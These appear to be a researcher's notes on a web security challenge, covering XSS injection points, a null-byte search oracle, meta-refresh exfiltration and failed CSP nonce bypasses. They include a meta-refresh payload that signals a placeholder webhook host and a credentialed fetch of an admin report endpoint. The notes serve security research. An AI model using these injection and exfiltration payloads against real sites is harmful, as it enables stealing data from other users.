# XSS CSP Bypass Techniques & Oracles

## Null-Byte Search Oracle (Proven - Intigriti 0626)

When a web app searches by "title prefix" and reflects the query unescaped in "X not found":

### Mechanism
- `q=PREFIX%00<meta http-equiv="refresh" content="0;url=https://HOOK?t=1">`
- Server splits at null: searches for "PREFIX", renders "PAYLOAD not found" in body
- **Exact title match** suppresses "not found" entirely → meta refresh NOT in DOM → no webhook hit
- **Non-match** → "not found" renders with meta refresh → webhook receives hit
- Oracle: no hit = exact match, hit = not exact match

### Key Behaviors Discovered
- Null byte splits search prefix from reflected body content
- Partial prefix + null → "not found" ALWAYS shows (even when prefix matches)
- EXACT full title + null → "not found" suppressed completely
- This means oracle only detects **exact full title match**, not prefix matching

### Limitations
- Can't do char-by-char prefix brute-force (only exact match detection)
- ~10s per test (submit report + wait for bot + check webhook)
- Need to guess full candidate titles

## Meta Refresh Exfiltration Constraints (Chrome 2026)

### What Works
- Simple meta refresh to external URL (same-origin and cross-origin)
- Meta refresh in `<head>` via description injection
- Meta refresh in `<body>` via q "not found" injection (conditional!)
- Admin bots follow meta refresh redirects

### What Doesn't Work
- **Dangling meta refresh with page content capture**: Chrome validates URL and rejects when content contains raw `"` character after `url=`
- Chrome's meta refresh URL parser stops/fails at literal `"` in the captured URL
- The template close `">` always injects `"` as first captured char
- Attempts to consume `"` via extra attributes (x='"') didn't solve the root issue

### Key Chrome Behavior
- Meta refresh in single-quoted `content='...'`: attribute spans until next `'`
- URL extraction: if first char after `url=` is not `'` or `"`, URL = until end of attr value
- BUT Chrome appears to validate/reject URLs with raw HTML chars (`<`, `>`, `"`, newlines)

## CSP Nonce Bypass Research (2024-2026 Chrome)

### Confirmed NOT Working (as of Chrome 137)
- `<script type="importmap">` without nonce: CSP blocks it
- `<script type="speculationrules">` without nonce: CSP blocks it  
- `<script type="module">` without nonce: CSP blocks it
- Inline event handlers (onerror, onclick, ontoggle): blocked by script-src 'nonce-X'
- `<base href>` override: blocked by base-uri 'none'
- Nonce prediction/derivation: truly random per request
- CSP header injection via parameters: special chars stripped
- `<meta http-equiv="Content-Security-Policy">` override: can only restrict, not loosen
- Multiple CSP headers: intersection (most restrictive wins)

### CSP Policy Pattern
```
default-src 'none'; script-src 'nonce-X'; style-src 'nonce-X'; form-action 'self'; base-uri 'none'; report-uri /csp-report/OWNER
```

### Architectural Notes
- Nonce appears only on `<link>` tag BEFORE injection point (can't capture backward)
- No scripts on page = no script gadgets to exploit
- form-action 'self' blocks external form submission
- default-src 'none' blocks img/connect/frame/media/object loads

## CORS on CSP Report Endpoint

### Discovery
- `/csp-report/USERNAME` has `access-control-allow-origin: <reflects Origin>` + `access-control-allow-credentials: true`
- This is intentional and exploitable FROM same-origin XSS context
- Regular users get 403, admin may get 200
- Returns `application/json` content-type

### Exploitation Path (Requires XSS First)
If XSS achieved on same-origin page without CSP (e.g., /notes):
```javascript
fetch('/csp-report/admin', {credentials:'include'}).then(r=>r.json())
```

## HTML Injection Patterns

### Description Parameter (HEAD injection)
- `<meta name="description" content="Notes search — INJECTION">`
- Quotes NOT escaped → can break out with `"`
- All special chars pass through: `< > ' \` / = ( ) { } ; : ! @ # $ % ^ & * |`
- Injection is AFTER the nonced `<link>` tag (can't steal nonce backward)

### Q Parameter (BODY injection)  
- Reflected completely unescaped in `<p>Q not found</p>`
- Conditional: only appears when q doesn't match any note title as prefix
- Can inject full HTML including `<script nonce="X">` (if nonce known)

### No Single Quotes in Page
- Between HEAD injection (line 7) and BODY injection (line ~51): zero literal `'` chars
- Note content escapes `'` to `&#39;`
- Enables dangling single-quoted attribute techniques (spans entire page)
